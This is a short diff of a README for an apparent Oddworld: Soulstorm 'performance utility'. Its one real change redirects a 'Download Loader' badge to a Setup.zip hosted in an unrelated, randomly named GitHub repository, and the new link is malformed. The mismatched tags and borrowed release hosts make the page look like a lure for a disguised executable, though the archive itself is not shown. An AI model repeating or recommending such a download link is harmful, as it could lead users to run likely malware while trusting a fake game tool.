@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Oddworld: Soulstorm Performance Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Oddworld-Soulstorm-Performance-Utility` · Updated: 2026-10-28
 
 **Tags:** `oddworld-soulstorm` `performance-utility` `soulslike` `action-rpg` `boss-fights` `windows` `steam`
+
